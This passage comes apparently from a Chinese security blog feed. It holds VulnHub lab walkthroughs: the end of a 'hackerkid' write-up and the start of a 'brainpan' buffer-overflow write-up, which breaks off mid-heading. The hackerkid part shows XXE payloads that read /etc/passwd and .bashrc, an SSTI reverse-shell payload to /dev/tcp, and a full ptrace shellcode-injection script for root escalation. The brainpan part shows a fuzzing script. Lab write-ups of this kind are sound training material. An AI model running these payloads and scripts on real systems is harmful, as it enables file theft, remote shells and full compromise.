alt="dig工具检测"></p><p>可以看到域名服务器返回了全部记录，存在DNS域传送漏洞。</p><p>发现一个可疑的站点，hackerkid.blackhat.local，把它加入hosts文件，然后访问该域名。</p><p><img src="/posts/a5e7f10c/image-20221111093213878.png"></p><p>查看网页源码，发现XML解析函数，可能存在XEE漏洞。</p><p><img src="/posts/a5e7f10c/image-20221111095550041.png"></p><h3 id="XEE注入攻击"><a href="#XEE注入攻击" class="headerlink" title="XEE注入攻击"></a>XEE注入攻击</h3><p><a href="https://xz.aliyun.com/t/3357">XEE(XML External Entity Injection)</a>漏洞是 OWASP TOP 10 漏洞之一，主要是由于XML解析时允许引用外部实体造成的,也称为XML外部实体注入攻击。</p><p>用burpsuite验证目标是否存在xee漏洞。首先，发现email地址处可以回显，那么可以作为注入处，方便查看返回结果。</p><p><img src="/posts/a5e7f10c/image-20221111113003193.png"></p><p>然后外部实体注入，选择查看&#x2F;etc&#x2F;passwd文件，看漏洞是否存在。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY test SYSTEM 'file:///etc/passwd'></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tel</span><span class="token punctuation">></span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tel</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>email</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&test;">&amp;test;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>email</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221111113335209.png"></p><p>看到返回了&#x2F;etc&#x2F;passwd文件内容，存在XEE漏洞！</p><p>尝试读取.bashrc文件，这个文件是用于用户的个性设置的，比如命令别名、环境变量等。在这里我们直接读取是报错的，使用php的base64过滤器进行编码并读取信息。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=/home/saket/.bashrc'></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221111115125659.png"></p><p>用decode功能将返回的数据进行base64解码</p><p><img src="/posts/a5e7f10c/image-20221111115305033.png"></p><p>发现一个账密信息。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#Setting Password for running python app</span><span class="token assign-left variable">username</span><span class="token operator">=</span><span class="token string">"admin"</span><span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token string">"Saket!#$%@!!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h3><p>信息收集时，有一个9999端口，是登录界面。尝试用这个账密信息登录。</p><p><img src="/posts/a5e7f10c/237025331b42d1ccd2ec30500e8304ef.png"></p><p>发现登录失败。观察这个账密，密码当中有个关键词Saket，在前面读取&#x2F;etc&#x2F;passwd中，saket账户是这个系统中除root外唯一能够有&#x2F;bin&#x2F;bash的权限，于是尝试使用saket进行登录，密码不变，成功登录！</p><p><img src="/posts/a5e7f10c/image-20221111120136294.png"></p><p><img src="/posts/a5e7f10c/image-20221111120159578.png"></p><p>在前面进行信息收集时，我们已经知道9999端口对应的服务是<strong>Tornado</strong>，这是一个Python的Web服务框架，这个框架是可能存在<a href="https://www.cnblogs.com/bmjoker/p/13508538.html"><strong>SSTI模板注入</strong></a>。</p><blockquote><p>服务器端模板注入（SSTI）：漏洞成因是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎（这里特指用于Web开发的模板引擎）在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p></blockquote><p>测试模板注入漏洞：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">$&#123;7*7&#125;,&#123;&#123;7*7&#125;&#125;   &#123;&#123;1+abcxyz&#125;&#125;$&#123;1+abcxyz&#125;&lt;%1+abcxyz%>[abcxyz]   //SSTI通用测试payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>第一个payload成功执行，输出了一个49的值，第二个payload是一个模板注入通用payload，页面报错说明存在模板注入漏洞。</p><p><img src="/posts/a5e7f10c/image-20221111161334407.png"></p><p><img src="/posts/a5e7f10c/image-20221111161600301.png"></p><p>既然存在模板注入漏洞，那就可以进行反弹shell的操作，首先在kali上监听端口，并将python反弹shell语句使用<a href="http://tools.jb51.net/static/encodetxt/urlencode_decode/index.html">encodeURIComponent</a>进行编码。</p><pre class="line-numbers language-none"><code class="language-none">编码前：&#123;% import os %&#125;&#123;&#123;os.system(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.71.139&#x2F;4444 0&gt;&amp;1&quot;&#39;)&#125;&#125; 编码后：%7B%25%20import%20os%20%25%7D%7B%7Bos.system(&#39;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.71.139%2F4444%200%3E%261%22&#39;)%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221111163815687.png"></p><p>成功获取了交互式shell！</p><h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><p>当前用户为saket，需要提升到root权限。</p><h4 id="Capabilitie提权"><a href="#Capabilitie提权" class="headerlink" title="Capabilitie提权"></a>Capabilitie提权</h4><p><strong>Capabilities机制</strong>是在Linux内核2.2之后引入的，原理很简单，就是将之前与超级用户root（UID&#x3D;0）关联的特权细分为不同的功能组，Capabilites作为线程（Linux并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。 这样一来，权限检查的过程就变成了：在执行特权操作时，<strong>如果线程的有效身份不是root，就去检查其是否具有该特权操作所对应的capabilities</strong>，并以此为依据，决定是否可以执行特权操作。 如果Capabilities设置不正确，就会让攻击者有机可乘，实现权限提升。</p><p>使用如下命令发现具有Capabilities特殊操作权限的程序：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/sbin/getcap <span class="token parameter variable">-r</span> / <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token parameter variable">-r</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221111171537947.png"></p><p>通过上图发现python具备<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace">cap_sys_ptrace+ep</a>能力，利用它进行提权。这里需要用到一个提权脚本，这个脚本的作用就是对root权限的进程注入python类型shellcode，利用python具备的cap_sys_ptrace+ep 能力实现权限提升，该脚本如果执行成功，会在靶机的本地监听5600端口，我们也可以修改shellcode部分让其监听其他端口。</p><p>在kali上编辑以下代码，上传到靶机上执行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ctypes<span class="token keyword">import</span> sys<span class="token keyword">import</span> struct<span class="token comment"># Macros defined in &lt;sys/ptrace.h></span><span class="token comment"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span>PTRACE_POKETEXT <span class="token operator">=</span> <span class="token number">4</span>PTRACE_GETREGS <span class="token operator">=</span> <span class="token number">12</span>PTRACE_SETREGS <span class="token operator">=</span> <span class="token number">13</span>PTRACE_ATTACH <span class="token operator">=</span> <span class="token number">16</span>PTRACE_DETACH <span class="token operator">=</span> <span class="token number">17</span><span class="token comment"># Structure defined in &lt;sys/user.h></span><span class="token comment"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span><span class="token keyword">class</span> <span class="token class-name">user_regs_struct</span><span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>Structure<span class="token punctuation">)</span><span class="token punctuation">:</span>    _fields_ <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token punctuation">(</span><span class="token string">"r15"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r14"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r13"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r12"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rbp"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rbx"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r11"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r10"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r9"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r8"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rax"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rcx"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rdx"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rsi"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rdi"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"orig_rax"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rip"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"cs"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"eflags"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rsp"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"ss"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"fs_base"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"gs_base"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"ds"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"es"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"gs"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>libc <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>CDLL<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span>pid<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># Define argument type and respone type.</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">.</span>argtypes <span class="token operator">=</span> <span class="token punctuation">[</span>ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_void_p<span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_void_p<span class="token punctuation">]</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">.</span>restype <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>c_uint64<span class="token comment"># Attach to the process</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">(</span>PTRACE_ATTACH<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>registers<span class="token operator">=</span>user_regs_struct<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># Retrieve the value stored in registers</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">(</span>PTRACE_GETREGS<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>byref<span class="token punctuation">(</span>registers<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Instruction Pointer: "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>registers<span class="token punctuation">.</span>rip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Injecting Shellcode at: "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>registers<span class="token punctuation">.</span>rip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</span>shellcode <span class="token operator">=</span> <span class="token string">"\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"</span><span class="token comment"># Inject the shellcode into the running process byte by byte.</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Convert the byte to little endian.</span>    shellcode_byte_int<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span>i<span class="token punctuation">:</span><span class="token number">4</span><span class="token operator">+</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    shellcode_byte_little_endian<span class="token operator">=</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;I"</span><span class="token punctuation">,</span> shellcode_byte_int<span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>    shellcode_byte<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>shellcode_byte_little_endian<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token comment"># Inject the byte.</span>    libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">(</span>PTRACE_POKETEXT<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_void_p<span class="token punctuation">(</span>registers<span class="token punctuation">.</span>rip<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>shellcode_byte<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Shellcode Injected!!"</span><span class="token punctuation">)</span><span class="token comment"># Modify the instuction pointer</span>registers<span class="token punctuation">.</span>rip<span class="token operator">=</span>registers<span class="token punctuation">.</span>rip<span class="token operator">+</span><span class="token number">2</span><span class="token comment"># Set the registers</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">(</span>PTRACE_SETREGS<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>byref<span class="token punctuation">(</span>registers<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Final Instruction Pointer: "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>registers<span class="token punctuation">.</span>rip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Detach from the process.</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">(</span>PTRACE_DETACH<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>kali:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-m</span> http.server <span class="token number">8088</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>靶机:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://192.168.71.139:8088/inject.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因需要root进程进行注入，编写脚本对root进程批量尝试.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">`</span><span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> root<span class="token operator">|</span><span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"grep"</span><span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'&#123;print $2&#125;'</span><span class="token variable">`</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span> python2.7 inject.py <span class="token variable">$i</span><span class="token punctuation">;</span> <span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221111175514443.png"></p><p>脚本执行成功，可以看到5600端口正在监听。</p><p><img src="/posts/a5e7f10c/image-20221111180927303.png"></p><p>连接5600端口，发现已获取root权限。</p><p><img src="/posts/a5e7f10c/image-20221111181139962.png"></p><p>提权完成！</p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>此靶机考察的点：</p><ul><li>目录探测</li><li>域传送漏洞</li><li>XXE漏洞</li><li>STTI模板注入</li><li>linux-capabilities提权</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>brainpan：缓冲区溢出漏洞的利用</title>
      <link href="/posts/229625f.html"/>
      <url>/posts/229625f.html</url>
      
        <content type="html"><![CDATA[<p>brainpan是vulnhub上一个类OSCP风格的靶机。<br>靶机下载地址：<a href="https://www.vulnhub.com/entry/brainpan-1,51/">https://www.vulnhub.com/entry/brainpan-1,51/</a></p><hr><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>首先用nmap扫描靶机开放端口，同时打印banner信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">--script</span> banner <span class="token number">192.168</span>.71.145<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102084915741.png" alt="扫描结果"></p><p>发现靶机开放了9999和10000两个端口。其中10000端口是HTTP服务，9999端口未知，可以尝试用telnet先接入一下。</p><p><img src="/posts/229625f/image-20221102090022123.png" alt="10000端口页面"></p><p><img src="/posts/229625f/image-20221102090054346.png" alt="连接9999端口"></p><p>10000端口看一下网页源码，没发现特别之处。9999端口让输入密码，其它也没什么了。</p><p><img src="/posts/229625f/image-20221102090144519.png" alt="10000端口网页源码"></p><h3 id="目录探测"><a href="#目录探测" class="headerlink" title="目录探测"></a>目录探测</h3><p>利用kali自带的DIRB工具对web目录进行探测。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.71.145:10000 <span class="token parameter variable">-w</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102090246342.png" alt="目录探测"></p><p>发现一个&#x2F;bin目录，访问看看。</p><p><img src="/posts/229625f/image-20221102090352185.png" alt="目录"></p><p>发现一个exe文件，将它下载下来在win7虚拟机里面运行。</p><p><img src="/posts/229625f/image-20221102090424651.png" alt="运行brainpan文件"></p><p>看样子是一个在监听9999端口的程序。<br>用IDA程序可以很容易得看出这个程序存在strcpy()这个危险函数且存在缓冲区溢出漏洞。</p><p><img src="/posts/229625f/image-20221102090510764.png"></p><p><img src="/posts/229625f/image-20221102090518914.png"></p><p>但是在OSCP考试中不允许使用IDA Pro，因此可以先利用strings查看程序中的字符串，看是否存在危险函数。</p><p><img src="/posts/229625f/image-20221102091347540.png"></p><p>发现存在strcpy()危险函数，可能存在缓冲区溢出漏洞。</p><h2 id="2-验证缓冲区溢出漏洞"><a href="#2-验证缓冲区溢出漏洞" class="headerlink" title="2.验证缓冲区溢出漏洞"></a>2.验证缓冲区溢出漏洞</h2><p>验证缓冲区溢出漏洞的基本思路：<br>利用代码进行fuzz找出是否存在缓冲区溢出漏洞（即查看能否控制EIP），并进行之后的确定偏移量、确定返回地址、生成shellcode。</p><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><p>向目标程序发送很长的字符串，直到程序崩溃，确认导致程序崩溃的大概字符串长度。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sockethost<span class="token operator">=</span><span class="token string">'192.168.71.146'</span>port<span class="token operator">=</span><span class="token number">9999</span><span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b"A"</span><span class="token punctuation">]</span>counter <span class="token operator">=</span> <span class="token number">100</span><span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">50</span><span class="token punctuation">:</span>    <span class="token builtin">buffer</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">b"A"</span> <span class="token operator">*</span> counter<span class="token punctuation">)</span>    counter <span class="token operator">=</span> counter <span class="token operator">+</span> <span class="token number">100</span><span class="token keyword">for</span> string <span class="token keyword">in</span> <span class="token builtin">buffer</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Fuzzing PASS with &#123;&#125; bytes"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>string<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102092317432.png"></p><p><img src="/posts/229625f/image-20221102092332545.png"></p><p><img src="/posts/229625f/image-20221102092353514.png"></p><p><img src="/posts/229625f/image-20221102092410868.png"></p><p>当发送字符串长度为600字节时，程序崩溃。在debugger中可以看到栈和EIP都被“A”（0x41）填满，即控制了EIP，使其指向了非法地址。</p><h3 id="确定偏移量"><a href="#确定偏移量" class="headerlink" title="确定偏移量"></a>确定偏移量</h3><p>确定多长的字符串可以刚好覆盖EIP。<br>利用kali的工具msf-pattern_create创建长度为600的字符串，发送给程序。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf-pattern_create <span class="token parameter variable">-l</span> <span class="token number">600</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102092513918.png"></p><p><img src="/posts/229625f/image-20221102092528409.png"></p><p>发送完成后，发现EIP的值为35724134<br>利用msf-pattern_offset 工具确认偏移位置，偏移为524。</p><p><img src="/posts/229625f/image-20221102092605952.png"></p><h3 id="确定返回地址"><a href="#确定返回地址" class="headerlink" 